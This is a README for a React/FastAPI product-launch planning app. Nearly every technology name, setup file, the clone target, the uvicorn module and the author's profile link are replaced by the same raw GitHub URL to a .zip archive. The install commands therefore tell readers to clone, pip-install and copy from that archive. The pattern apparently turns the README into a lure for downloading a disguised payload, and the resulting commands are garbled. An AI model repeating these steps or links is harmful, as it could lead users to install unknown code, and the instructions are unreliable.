# Product Launch Planner

A comprehensive web application for planning and managing product launches efficiently. This tool helps teams organize, track, and execute product launches with features for project management, task tracking, and collaboration.

## Features

- **Dashboard Overview**
  - Total Projects Overview
  - Active Users Tracking
  - Task Completion Status
  - Project Timeline Visualization
  - User Growth Analytics

- **Project Management**
  - Create and Manage Launch Projects
  - Track Project Progress
  - Set Project Milestones
  - Assign Team Members

- **Task Management**
  - Create and Assign Tasks
  - Track Task Status
  - Set Due Dates
  - Priority Management

- **User Management**
  - Role-based Access Control
  - Team Member Management
  - Activity Tracking
  - User Permissions

- **Product Management**
  - Product Details Management
  - Launch Timeline Planning
  - Resource Allocation
  - Success Metrics Tracking

## Tech Stack

- **Frontend**
  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
  - TypeScript
  - React Router
  - Tailwind CSS
  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip for Analytics

- **Backend**
  - FastAPI (Python)
  - PostgreSQL
  - SQLAlchemy ORM
  - JWT Authentication

## Getting Started

### Prerequisites

- https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip (v14 or higher)
- Python 3.8+
- PostgreSQL

### Installation

1. Clone the repository
```bash
git clone https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
cd product-launch-planner
```

2. Install frontend dependencies
```bash
cd frontend
npm install
```

3. Install backend dependencies
```bash
cd backend
python -m venv venv
source venv/bin/activate  # On Windows use: venv\Scripts\activate
pip install -r https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
```

4. Set up environment variables
```bash
# Create .env file in backend directory
cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip .env
# Create .env file in frontend directory
cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip .env
```

5. Start the development servers
```bash
# Start backend server
cd backend
uvicorn https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip --reload

# Start frontend server (in a new terminal)
cd frontend
npm run dev
```

## Environment Variables

### Backend
```
DATABASE_URL=postgresql://user:password@localhost:5432/dbname
SECRET_KEY=your_secret_key
ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=30
```

### Frontend
```
VITE_API_URL=http://localhost:8000/api/v1
```

## Project Structure

```
product-launch-planner/
├── frontend/                # React frontend application
│   ├── src/
│   │   ├── components/     # Reusable components
│   │   ├── contexts/       # React contexts
│   │   ├── pages/         # Page components
│   │   └── utils/         # Utility functions
│   └── public/            # Static files
├── backend/               # FastAPI backend application
│   ├── app/
│   │   ├── models/       # Database models
│   │   ├── routers/      # API routes
│   │   ├── schemas/      # Pydantic schemas
│   │   └── utils/        # Utility functions
│   └── tests/            # Backend tests
└── docs/                 # Documentation
```

## Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

**Dawood Siddiq**
- GitHub: [@dawoodsiddiq](https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip)

## Acknowledgments

- Thanks to all contributors who have helped shape this project
- Special thanks to the open-source community for the tools and libraries used in this project 